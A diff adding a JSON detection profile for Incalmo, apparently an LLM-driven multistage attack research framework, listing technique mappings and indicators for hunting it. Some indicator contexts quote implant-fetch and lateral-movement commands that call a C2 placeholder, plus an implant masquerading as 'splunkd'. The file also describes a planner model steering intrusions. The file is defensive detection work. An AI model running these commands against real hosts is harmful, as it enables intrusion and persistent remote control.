@@ -1,0 +1,327 @@
+{
+  "slug": "incalmo",
+  "name": "Incalmo",
+  "description": "CMU research system for multistage attacks: a planner model drives Caldera Sandcat implants through an unauthenticated Flask C2",
+  "seenIn": "No public report of use in an attack. Covered from its source code",
+  "counts": {
+    "kqlHunts": 4,
+    "analytics": 1,
+    "sigma": 5,
+    "suricata": 13,
+    "yara": 3,
+    "indicators": 30
+  },
+  "techniques": [
+    {
+      "id": "T1021.004",
+      "score": 2,
+      "comment": "KQL hunt: Incalmo's implant and commands on the hosts it attacks; Sigma: Incalmo Spreading a Caldera Sandcat Implant"
+    },
+    {
+      "id": "T1046",
+      "score": 1,
+      "comment": "Sigma: Incalmo Per-Command Script or Tool Command Line"
+    },
+    {
+      "id": "T1059.004",
+      "score": 5,
+      "comment": "KQL hunt: Incalmo's implant and commands on the hosts it attacks; Sentinel analytics: Incalmo implant spread or per-command script on a host; Sigma: Incalmo Per-Command Script or Tool Command Line; Suricata: 3818307 TD Incalmo per-command script fetched by an implant; Suricata: 3818314 TD Incalmo command tasking request"
+    },
+    {
+      "id": "T1071.001",
+      "score": 17,
+      "comment": "KQL hunt: Incalmo C2 protocol and operator API in web, proxy and firewall logs; KQL hunt: Incalmo C2 server on a host you monitor; KQL hunt: Indicator sweep with the agentic watchlist; Sentinel analytics: Incalmo implant spread or per-command script on a host; Sigma: Incalmo C2 Operator API Requested Through a Proxy; Sigma: Incalmo C2 Server or Its Celery Worker; Suricata: 3818301 TD Incalmo C2 server root response; Suricata: 3818302 TD Incalmo C2 server health response; Suricata: 3818303 TD Incalmo or Caldera Sandcat beacon answer; Suricata: 3818304 TD Incalmo or Caldera Sandcat beacon reques"
+    },
+    {
+      "id": "T1105",
+      "score": 10,
+      "comment": "KQL hunt: Incalmo C2 protocol and operator API in web, proxy and firewall logs; KQL hunt: Incalmo's implant and commands on the hosts it attacks; KQL hunt: Indicator sweep with the agentic watchlist; Sigma: Incalmo Implant, Script or Run File Written; Sigma: Incalmo Spreading a Caldera Sandcat Implant; Suricata: 3818305 TD Incalmo or Caldera Sandcat implant download; Suricata: 3818306 TD Incalmo agent download route; Suricata: 3818307 TD Incalmo per-command script fetched by an implant; Suricata: 3818308 TD Incalmo exploit or helper payload fetched by an implant; YARA: Incalmo_C2_Server_Source"
+    },
+    {
+      "id": "T1570",
+      "score": 2,
+      "comment": "KQL hunt: Incalmo's implant and commands on the hosts it attacks; Sigma: Incalmo Spreading a Caldera Sandcat Implant"
+    },
+    {
+      "id": "T1588.002",
+      "score": 2,
+      "comment": "KQL hunt: Incalmo C2 server on a host you monitor; YARA: Incalmo_Model_Prompts"
+    }
+  ],
+  "indicators": [
+    {
+      "type": "string",
+      "value": "Incalmo C2 Server API",
+      "confidence": "high",
+      "context": "JSON message the Incalmo C2 server returns on GET / with no authentication, Flask on 0.0.0.0:8888 published by both compose files: {\"message\": \"Incalmo C2 Server API\"} (c2server.py:172-179)",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/c2server/c2server.py#L172-L179",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "string",
+      "value": "Flask + Celery",
+      "confidence": "medium",
+      "context": "Value of \"server\" in the unauthenticated /health answer of the Incalmo C2, with running_strategies and celery_workers (c2server.py:152-169). Pair it with running_strategies",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/c2server/c2server.py#L152-L169",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "string",
+      "value": "eyJwYXciOiAi",
+      "confidence": "medium",
+      "context": "Start of every Incalmo beacon answer: base64 of {\"paw\": \" followed by sleep 3, watchdog 60 and the instructions (agent_routes.py:84-92). The protocol is Caldera Sandcat's, so expect a Caldera server to answer the same way",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/c2server/routes/agent_routes.py#L84-L92",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "uri_string",
+      "value": "/beacon",
+      "confidence": "low",
+      "context": "Sandcat implant check-in path on the Incalmo C2, POST every 3 seconds with a base64 JSON body (agent_routes.py:31-92). Caldera uses the same path; common word, use with the answer prefix eyJwYXciOiAi",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/c2server/routes/agent_routes.py#L31",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "uri_string",
+      "value": "/get_llm_agent_action",
+      "confidence": "high",
+      "context": "Incalmo C2 route the strategy polls for queued LLM sub-agent actions (llm_routes.py:30); /start_llm_agent_action queues them",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/c2server/routes/llm_routes.py#L30",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "uri_string",
+      "value": "/stream_llm_agent_logs",
+      "confidence": "high",
+      "context": "Incalmo C2 server-sent events stream of the LLM sub-agent log, read by the Incalmo UI (logging_routes.py:165)",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/c2server/routes/logging_routes.py#L165",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "uri_string",
+      "value": "/update_environment_state",
+      "confidence": "medium",
+      "context": "Incalmo C2 route the strategy posts the discovered host list to after its actions (environment_routes.py:17, server_api.py:170-184)",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/c2server/routes/environment_routes.py#L17",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "uri_string",
+      "value": "/send_manual_command",
+      "confidence": "medium",
+      "context": "Unauthenticated Incalmo C2 route that queues an operator shell command for an implant (command_routes.py:30-72); /send_command is the strategy's own",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/c2server/routes/command_routes.py#L30",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "uri_string",
+      "value": "/agent/download",
+      "confidence": "low",
+      "context": "Incalmo C2 route that serves files from incalmo/c2server/agents/ by the File request header, POST (file_routes.py:37-56)",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/c2server/routes/file_routes.py#L37",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "string",
+      "value": "dynamic_payload_",
+      "confidence": "high",
+      "context": "Prefix of the per-command script the Incalmo C2 writes for every strategy command, dynamic_payload_<C2C_PORT>_<paw>.sh; the implant fetches it with POST /file/download and a File header and runs it with sh (command_routes.py:94)",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/c2server/routes/command_routes.py#L94",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "file_name",
+      "value": "sandcat_tmp.go",
+      "confidence": "high",
+      "context": "Name of the Sandcat implant Incalmo copies to a new host over scp and starts with nohup ./sandcat_tmp.go -server <C2> -group red >/tmp/sc.log (ssh_lateral_move.py:16-22)",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/core/actions/LowLevel/ssh_lateral_move.py#L16-L22",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "file_path",
+      "value": "/tmp/sc.log",
+      "confidence": "medium",
+      "context": "Implant output file of Incalmo's ssh lateral move; it prints AGENTLOG: and the first 300 bytes of it (ssh_lateral_move.py:18-19). Short name, check the process that wrote it",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/core/actions/LowLevel/ssh_lateral_move.py#L18-L19",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "string",
+      "value": "C2:%{http_code}",
+      "confidence": "high",
+      "context": "curl write-out Incalmo runs on a new host before starting the implant: curl -s -m 5 -o /dev/null -w C2:%{http_code} <C2>/ (ssh_lateral_move.py:17)",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/core/actions/LowLevel/ssh_lateral_move.py#L17",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "string",
+      "value": "file:sandcat.go",
+      "confidence": "medium",
+      "context": "Header Incalmo sends to pull the Sandcat implant: curl -svkOJ -X POST -H \"file:sandcat.go\" -H \"platform:linux\" <C2>/file/download over ssh (ssh_spawn_agent.py:13), and the same one-liner in its sub-agent prompts. It follows Caldera's download convention",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/core/actions/LowLevel/ssh_spawn_agent.py#L13",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "file_name",
+      "value": "splunkd",
+      "confidence": "low",
+      "context": "Name Incalmo's lateral-movement, privilege-escalation and Metasploit prompts tell the model to save the Sandcat implant under (~/splunkd or /tmp/splunkd, run with -server <C2> -group red); the repository's example run shows /tmp/splunkd. Splunk's own daemon lives in <SPLUNK_HOME>/bin/",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/core/actions/HighLevel/llm_agents/lateral_movement/preprompt.txt#L10",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "string",
+      "value": "There is a Caldera command and control server running with an address",
+      "confidence": "high",
+      "context": "Opening of Incalmo's lateral-movement and privilege-escalation sub-agent prompts, visible in decrypted model traffic (lateral_movement/preprompt.txt:5)",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/core/actions/HighLevel/llm_agents/lateral_movement/preprompt.txt#L5",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "string",
+      "value": "you will be using the Incalmo framework in Python",
+      "confidence": "high",
+      "context": "Incalmo planner prompt, visible in decrypted model traffic: To operate within the cyber range you will be using the Incalmo framework in Python. (preprompts/incalmo/pre_prompt.txt:7)",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/core/strategies/llm/interfaces/preprompts/incalmo/pre_prompt.txt#L7",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "string",
+      "value": "incalmo.c2server.celery.celery_worker",
+      "confidence": "high",
+      "context": "Celery app Incalmo's start scripts run as worker and beat next to the C2: uv run celery -A incalmo.c2server.celery.celery_worker worker --concurrency=1 (docker/attacker/start.sh:17-22)",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/docker/attacker/start.sh#L17-L22",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "file_path",
+      "value": "incalmo/c2server/c2server.py",
+      "confidence": "high",
+      "context": "Incalmo C2 server script, started as uv run ./incalmo/c2server/c2server.py (docker/attacker/start.sh:25, docker/c2server/start.sh:18)",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/docker/attacker/start.sh#L25",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "string",
+      "value": "msfrpcd -P password",
+      "confidence": "medium",
+      "context": "Metasploit RPC daemon with a fixed password in the Incalmo attacker container (docker/attacker/start.sh:15); not published by Compose",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/docker/attacker/start.sh#L15",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "string",
+      "value": "Starting Incalmo C2 server using configservice",
+      "confidence": "high",
+      "context": "Line Incalmo's command-line entry point prints when a run starts (main.py:9)",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/main.py#L9",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "file_path",
+      "value": "/tmp/state_store.db",
+      "confidence": "medium",
+      "context": "SQLite database of the Incalmo C2 with the discovered hosts, table environment (state_store.py:9)",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/c2server/state_store.py#L9",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "file_path",
+      "value": "plugins/deception/payloads/exploit.py",
+      "confidence": "medium",
+      "context": "Relative path Incalmo's lateral-movement and privilege-escalation sub-agents write the model's Python exploit to before running python3 exploit.py on the implant host (llm_lateral_movement.py:79, llm_privilege_escalation.py:86-87); a Caldera plugin path",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/core/actions/HighLevel/llm_agents/lateral_movement/llm_lateral_movement.py#L79",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "file_name",
+      "value": "_litellm_key_status.json",
+      "confidence": "medium",
+      "context": "File in Incalmo's output folder with the last seen LiteLLM key spend and budget (litellm_key_status.py:24-26)",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/core/services/litellm_key_status.py#L24-L26",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "string",
+      "value": "-Tuning 8 -maxtime 60s -timeout 3",
+      "confidence": "medium",
+      "context": "nikto options Incalmo uses on every web port: nikto -h <ip> -p <port> -Tuning 8 -maxtime 60s -timeout 3 (nikto_scan.py:20)",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/core/actions/LowLevel/nikto_scan.py#L20",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "string",
+      "value": "-timeout 5 -severity critical -j -silent",
+      "confidence": "medium",
+      "context": "nuclei options Incalmo uses: nuclei -u <ip>:<port> -timeout 5 -severity critical -j -silent (nuclei_scan.py:22)",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/core/actions/LowLevel/nuclei_scan.py#L22",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "string",
+      "value": "[c2-retry]",
+      "confidence": "low",
+      "context": "Prefix of the stdout line the Incalmo strategy prints each time it retries the C2: [c2-retry] <time> <method> <url> — bridging failure: <reason> (server_api.py:38)",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/api/server_api.py#L38",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "favicon_mmh3",
+      "value": "-2009722838",
+      "confidence": "low",
+      "context": "Stock create-react-app favicon.ico of the Incalmo UI dev server (md5 c92b85a5b907c70211f4ec25e29a8c4a). Every unmodified create-react-app serves it; use only with the title Incalmo",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/frontend/incalmo-ui/public/favicon.ico",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "url",
+      "value": "https://api.typesafe.ai/v1/systemone",
+      "confidence": "low",
+      "context": "Default endpoint of the TypeSafe Jev model Incalmo can use as a planner (jev_client.py:31). Any TypeSafe customer calls it",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/core/strategies/llm/interfaces/jev_client.py#L31",
+      "reported": "2026-11-02"
+    },
+    {
+      "type": "url",
+      "value": "https://openrouter.ai/api/alpha/decisions",
+      "confidence": "low",
+      "context": "OpenRouter Decisions API Incalmo uses for the Jev model through OpenRouter (langchain_registry.py:345-346). Shared with every OpenRouter customer",
+      "source": "ThreatDefence review of the Incalmo source code",
+      "sourceUrl": "https://github.com/cylabcyberautonomy/Incalmo/blob/8cd02e0e94889461bd04924c1db5b79cf7dc256c/incalmo/core/strategies/llm/langchain_registry.py#L345-L346",
+      "reported": "2026-11-02"
+    }
+  ],
+  "indicatorsTruncated": false,
+  "upstreamUrl": "https://github.com/ThreatDefence/agentic-attack-detections/tree/main/frameworks/incalmo",
+  "source": "github.com/ThreatDefence/agentic-attack-detections",
+  "license": "MIT"
+}
